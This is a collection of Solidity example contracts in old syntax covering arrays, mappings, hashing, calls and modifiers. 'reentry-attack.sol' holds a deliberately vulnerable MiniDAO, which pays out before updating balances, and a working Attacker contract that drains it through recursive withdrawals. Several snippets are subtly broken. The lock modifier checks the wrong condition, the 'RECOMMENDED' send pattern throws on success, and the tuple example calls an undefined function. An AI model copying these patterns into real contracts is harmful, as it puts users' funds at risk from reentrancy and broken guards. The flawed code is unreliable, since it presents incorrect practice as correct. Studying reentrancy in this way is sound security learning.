This is a collection of Solidity snippets for people who like to learn by example. Maybe some day it will turn into more of a step-by-step learning experience.

## Examples

### array-delete.sol
```js
contract ArrayDelete {
    uint[] numbers;

    function main() returns (uint[]) {
        numbers.push(100);
        numbers.push(200);
        numbers.push(300);
        numbers.push(400);
        numbers.push(500);

        delete numbers[2];

        // 100, 200, 0, 400, 500
        return numbers;
    }
}
```

### array-of-strings.sol
```js
contract MyContract {
    string[] strings;

    function MyContract() {
        strings.push("hi");
        strings.push("bye");
    }

    function bar() constant returns(string) {
        return strings[1];
    }
}
```

### array-passing.sol
```js
contract A {
    uint256[] public numbers;
    function A(uint256[] _numbers) {
        for(uint256 i=0; i<_numbers.length; i++) {
            numbers.push(_numbers[i]);
        }
    }

    function get() returns (uint256[]) {
        return numbers;
    }
}

contract Manager {
    function makeA() returns (uint256) {
        uint256[] numbers;
        numbers.push(10);

        A a = new A(numbers);

        return a.numbers(0);
    }
}
```

### call-dynamic.sol
```js
contract MyContract {

    uint x = 0;

    function foo(uint _x) {
        x = 10 + _x;
    }

    function bar() constant returns(uint) {
        this.call(bytes4(sha3('foo(uint256)')), 1);
        return x; // returns 11
    }
}

```

### call-other-contract.sol
```js
import 'OtherContract.sol'

contract MyContract {
  OtherContract other;
  function MyContract(address otherAddress) {
    other = OtherContract(otherAddress);
  }
  function foo() {
    other.bar();
  }
}
```

### error-trap.sol
```js
contract ContractTrapped {
    function foo(uint a) constant returns(string, uint) {
        uint nullReturn;
        if(a < 100) {
            return('Too small', nullReturn);
        }
        uint b = 5;
        return ('', b);
    }
}
```

### f.value.sol
```js
contract One{
    string public word;

    function setMsg(string whatever) {
        word = whatever;
    }
}

contract Two{
    function Two(){
        One o = One(0x692a70d2e424a56d2c6c27aa97d1a86395877b3a);
        o.setMsg.value(0)("test");
    }
}
```

### factory.sol
```js
contract A {
    uint[] public amounts;
    function init(uint[] _amounts) {
        amounts = _amounts;
    }
}

contract Factory {
    struct AData {
        uint[] amounts;
    }
    mapping (address => AData) listOfData;

    function set(uint[] _amounts) {
        listOfData[msg.sender] = AData(_amounts);
    }

    function make() returns(address) {
        A a = new A();
        a.init(listOfData[msg.sender].amounts);
        return address(a);
    }
}
```

### mapping-delete.sol
```js
contract MyContract {
    struct Data {
        uint a;
        uint b;
    }
    mapping (uint => Data) public items;
    function MyContract() {
        items[0] = Data(1,2);
        items[1] = Data(3,4);
        items[2] = Data(5,6);
        delete items[1];
    }
}
```

### modifiers.sol
```js
contract MyContract {

  bool locked = false;

  modifier validAddress(address account) {
    if (account == 0x0) { throw; }
    _
  }

  modifier greaterThan(uint value, uint limit) {
      if(value <= limit) { throw; }
      _
  }

  modifier lock() {
    if(locked) {
        locked = true;
        _
        locked = false;
    }
  }

  function f(address account) validAddress(account) {}
  function g(uint a) greaterThan(a, 10) {}
  function refund() lock {
      msg.sender.send(0);
  }
}
```

### no-variable-length-returns.sol
```js
contract A {
  bytes8[] stuff;
  function get() constant returns(bytes8[]) {
    return stuff;
  }
}

contract B {
  A a;
  bytes8[] mystuff;
  function assign(address _a) {
      a = A(_a);
  }

  function copyToMemory() {
    // VM does not support variably-sized return types from external function calls
    // (ERROR: Type inaccessible dynamic type is not implicitly convertible...)
    bytes8[] memory stuff = a.get();
  }

  function copyToStorage() {
    // ERROR
    mystuff = a.get();
  }
}
```

### public-length.sol
```js
contract A {
    uint[] public nums;
    function getNumLength() returns(uint) {
        return nums.length;
    }
}

contract B {
    A a;

    function test() constant returns (uint) {
        // length is not accessible on public array from other contract
        //return a.nums.length();
        return a.getNumLength();
    }
}
```

### public-mapping.sol
```js
contract A {
    mapping(uint => uint) public objects;

    function B() {
        objects[0] = 42;
    }
}

contract B {
    // insert address of deployed First here
    A a = A(0x692a70d2e424a56d2c6c27aa97d1a86395877b3a);

    function get() returns(uint) {
        return a.objects(0);
    }
}

```

### reentry-attack.sol
```js
contract MiniDAO {
    mapping (address => uint) balances;

    function deposit() {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint amount) {
        if(balances[msg.sender] < amount) throw;
        msg.sender.call.value(amount)();
        balances[msg.sender] -= amount;
    }
}

contract Attacker {

    // limit the recursive calls to prevent out-of-gas error
    uint stack = 0;
    uint constant stackLimit = 10;
    uint amount;
    MiniDAO dao;

    function Attacker(address daoAddress) {
        dao = MiniDAO(daoAddress);
        amount = msg.value;
        dao.deposit.value(msg.value)();
    }

    function attack() {
        dao.withdraw(amount);
    }

    function() {
        if(stack++ < 10) {
            dao.withdraw(amount);
        }
    }
}
```

### remove-from-array.sol
```js
contract Contract {
    uint[] public values;

    function Contract() {
    }

    function find(uint value) returns(uint) {
        uint i = 0;
        while (values[i] != value) {
            i++;
        }
        return i;
    }

    function removeByValue(uint value) {
        uint i = find(value);
        removeByIndex(i);
    }

    function removeByIndex(uint i) {
        while (i<values.length-1) {
            values[i] = values[i+1];
            i++;
        }
        values.length--;
    }

    function getValues() constant returns(uint[]) {
        return values;
    }

    function test() returns(uint[]) {
        values.push(10);
        values.push(20);
        values.push(30);
        values.push(40);
        values.push(50);
        removeByValue(30);
        return getValues();
    }
}
```

### send-eth.sol
```js
contract MyContract {

    address a = 0x123;

    function foo() {

        // send ether with default 21,000 gas
        // likely causes OOG in callee
        a.send(1 ether);

        // send ether with all remaining gas
        // but no success check!
        a.call.value(1 ether)();

        // RECOMMENDED
        // send all remaining gas
        // explicitly handle callee throw
        if(a.call.value(1 ether)()) throw;
    }
}
```

### sha3.sol
```js
contract Sha3 {
    function hashArray() constant returns(bytes32) {
        bytes8[] memory tickers = new bytes8[](4);
        tickers[0] = bytes8('BTC');
        tickers[1] = bytes8('ETH');
        tickers[2] = bytes8('LTC');
        tickers[3] = bytes8('DOGE');
        return sha3(tickers);
        // 0x374c0504f79c1d5e6e4ded17d488802b5656bd1d96b16a568d6c324e1c04c37b
    }

    function hashPackedArray() constant returns(bytes32) {
        bytes8 btc = bytes8('BTC');
        bytes8 eth = bytes8('ETH');
        bytes8 ltc = bytes8('LTC');
        bytes8 doge = bytes8('DOGE');
        return sha3(btc, eth, ltc, doge);
        // 0xe79a6745d2205095147fd735f329de58377b2f0b9f4b81ae23e010062127f2bc
    }

    function hashAddress() constant returns(bytes32) {
        address account = 0x6779913e982688474f710b47e1c0506c5dca4634;
        return sha3(bytes20(account));
        // 0x229327de236bd04ccac2efc445f1a2b63afddf438b35874b9f6fd1e6c38b0198
    }

    function testPackedArgs() constant returns (bool) {
        return sha3('ab') == sha3('a', 'b');
    }

    function hashHex() constant returns (bytes32) {
        return sha3(0x0a);
        // 0x0ef9d8f8804d174666011a394cab7901679a8944d24249fd148a6a36071151f8
    }

    function hashInt() constant returns (bytes32) {
        return sha3(int(1));
    }

    function hashNegative() constant returns (bytes32) {
        return sha3(int(-1));
    }

    function hash8() constant returns (bytes32) {
        return sha3(1);
    }

    function hash32() constant returns (bytes32) {
        return sha3(uint32(1));
    }

    function hash256() constant returns (bytes32) {
        return sha3(uint(1));
    }

    function hashEth() constant returns (bytes32) {
        return sha3(uint(100 ether));
    }

    function hashWei() constant returns (bytes32) {
        return sha3(uint(100));
    }

    function hashMultipleArgs() constant returns (bytes32) {
        return sha3('a', uint(1));
    }

    function hashString() constant returns (bytes32) {
        return sha3('a');
    }
}
```

### tail-recursion.sol
```js
pragma solidity ^0.4.8;

contract MyContract {

    // naive recursion
    function sum(uint n) constant returns(uint) {
        return n == 1 ? 1 :
          n + sum(n-1);
    }

    // loop
    function sumloop(uint n) constant returns(uint) {
        uint256 total = 0;
        for(uint256 i=1; i<=n; i++) {
          total += i;
        }
        return total;
    }

    // tail-recursion
    function sumtailHelper(uint n, uint acc) private constant returns(uint) {
        return n == 1 ? acc :
          sumtailHelper(n-1, acc + n);
    }
    function sumtail(uint n) constant returns(uint) {
        return sumtailHelper(n, 0);
    }
}

```

### tuple.sol
```js
contract A {
    function tuple() returns(uint, string) {
        return (1, "Hi");
    }

    function getOne() returns(uint) {
        uint a;
        (a,) = Tuple();
        return a;
    }
}
```

